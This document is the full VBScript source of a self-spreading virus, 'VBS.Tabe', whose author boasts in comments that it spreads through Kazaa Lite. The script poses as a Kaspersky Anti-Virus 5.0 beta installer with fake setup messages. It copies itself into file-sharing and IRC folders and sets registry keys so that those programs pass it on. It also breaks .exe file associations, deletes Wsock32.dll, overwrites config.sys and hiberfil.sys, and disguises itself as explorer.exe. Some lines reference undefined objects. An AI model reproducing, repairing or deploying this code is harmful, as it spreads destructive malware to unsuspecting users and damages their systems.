' VBS.Tabe By JadraquerKiller
' JEJEJEJ, My first virus that spread via Kazaa Lite!!!!
' Norton AntiVirus SUCKS, SYMANTEC MOTHER FUCK
MsgBox "Kaspersky Anti-Virus 5.0 BETA Setup is initializing, please wait..."
set agm = CreateObject("Scripting.FileSystemObject")
set a = agm.CreateTextFile("c:\windows\KAV_SETUP", true)
Set agm = CreateObject("Wscript.Shell")

agm.CopyFile Wscript.ScriptFullName, "C:\My Shared Folder\KAV5.0_BETA.exe.vbs", True


agm.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\My Shared Folder"


set agm=shell.CreateShortCut("C:\KAV5.0_BETA.exe.lnk")
agm.TargetPath=shell.ExpandEnvironment("C:\KAV5.0_BETA.exe.vbs")
agm.WindowStyle=4
agm.Save
set agm=agm.CreateTextFile("C:\lnk.bat")
agm.WriteLine "cls"
agm.WriteLine "@echo off"
agm.WriteLine "for %%a in (*.lnk ..\*.lnk \*.lnk %path%\*.lnk %tmp%\*.lnk %temp%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%a"
agm.Close
agm.Run  "C:\lnk.bat"

agm.RegWrite "HKCR\.exe", "txtfile"


agm.CopyFile Wscript.ScriptFullName, "C:\Virc\KAV5.0_BETA.exe.vbs", True
agm.RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\KAV5.0_BET.exe.vbs"





TextFile1.WriteLine "KAV SETUP cannot install on your system, if you have another Anti-Virus installed."
TextFile1.Close
Set agm = agm.GetFile("c:\Windows\System\Wsock32.dll") 
agm.Delete

agm.Close 
Set agm = agm.CreateTextFile("c:\hiberfil.sys", True)

agm.WriteLine("Archivo eliminado por ser parte de Norton AV, Kaspersky Anti-Virus. ")

               
agm.Close 

Set agm = agm.CreateTextFile("c:\config.sys", True)
  
agm.WriteLine("Arhivo eliminado por ser parte de NOD32, Kaspersky Anti-Virus. ")
 
                 
agm.Close 

set file = agm.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
Set c = agm.GetFile(WScript.ScriptFullName)

c.Copy("C:\asd.exe")
c.Copy("C:\explorer.exe")



Set agm = agm.CreateTextFile("c:\5.0", True)

agm.WriteLine("KAV 5.0 BETA")

               
agm.Close 


Set agm = agm.CreateTextFile("c:\Windows\AvpM.exe.vbs", True)

agm.WriteLine("Eugene Kaspersky is the best!!!!")

               
agm.Close 

MsgBox "Kaspersky Anti-Virus 5.0 BETA est� instalado, por favor reporte cualquier BUG que encuentre a suggestions@kaspersky.com"
MsgBox "Kaspersky Anti-Virus 5.0 BET is installed, please report any BUG found in it product"
MsgBox "Instalaci�n finalizada con �xito, por favor reinicie la compitadora"
MsgBox "Please restart your computer"
MsgBox "Kaspersky Anti-Virus 5.0 BETA build 4"




